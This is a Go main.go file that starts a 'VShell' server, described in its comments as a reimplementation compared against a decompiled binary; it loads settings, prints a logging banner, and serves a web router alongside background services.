// Package main is the VShell server entry point.
//
// The startup sequence below is compared with the original binary's
// decompiled control flow. Reverse-engineering references identify observed
// call sites; they do not imply that every behavior is fully reproduced.
//
// Observed startup outline:
//  1. Load conf/setting.conf; exit if the settings loader returns nil.
//  2. Select the startup banner using master_type.
//  3. Initialize the application.
//  4. Mount and start the web router.
//  5. Start background services and keep the process alive.
//
// Binary symbols and offsets are retained as research notes, not as stable
// API names. Treat conclusions as provisional where the implementation status
// or supporting tests do not establish exact equivalence.
package main

import (
	"fmt"
	"net/http"
	"os"

	"vshell/controllers"
	"vshell/router"
	"vshell/utils"
)

// loadConfig loads the application settings. A nil result is treated as a
// fatal startup error; the process prints the loader error and exits.
func loadConfig() *utils.FullSettings {
	cfg := utils.GetFullSettings()
	if cfg == nil {
		fmt.Println("load config file error")
		os.Exit(1)
	}
	return cfg
}

// consoleBanner prints the console logger configuration using the current
// log level. The JSON-shaped text is emitted as a startup diagnostic.
func consoleBanner(cfg *utils.FullSettings) {
	fmt.Printf("console %s\n", fmt.Sprintf(`{"level":%d,"color":true}`, cfg.LogLevel))
}

// webBanner prints the file-logger configuration used by service mode.
// The filename and log level come from the loaded settings.
func webBanner(cfg *utils.FullSettings) {
	fmt.Printf("file %s\n", fmt.Sprintf(
		`{"level":%d,"filename":"%s","daily":false,"maxlines":100000,"color":true}`,
		cfg.LogLevel, cfg.LogPath))
}

// main initializes the settings, application, HTTP router, and background
// services. This is an in-progress reimplementation, so startup behavior may
// differ from the original binary.
func main() {
	cfg := loadConfig()

	// Keep the configured log level available to the startup path.
	_ = cfg.LogLevel

	// Service mode uses the file-logger banner; other modes use the console
	// banner. This describes the current implementation's branch behavior.
	switch cfg.MasterType {
	case "service":
		webBanner(cfg)
	default:
		consoleBanner(cfg)
	}

	// Initialize the application before starting the HTTP server.
	if err := controllers.AppStart(cfg); err != nil {
		fmt.Printf("start app: %v\n", err)
		os.Exit(1)
	}

	// Mount the web routes and serve them asynchronously so startup can
	// continue into background services. Listener errors are currently
	// discarded here; they are not reported to the caller.
	h := router.InitRouter()
	addr := fmt.Sprintf("%s:%d", cfg.WebIP, cfg.WebPort)
	go func() {
		if cfg.WebOpenSSL && cfg.WebCertFile != "" && cfg.WebKeyFile != "" {
			_ = http.ListenAndServeTLS(addr, cfg.WebCertFile, cfg.WebKeyFile, h)
		} else {
			_ = http.ListenAndServe(addr, h)
		}
	}()

	// Start background services, then block the main goroutine so the process
	// remains alive. The empty select has no shutdown path by itself.
	controllers.AppBackground()
	select {}
}
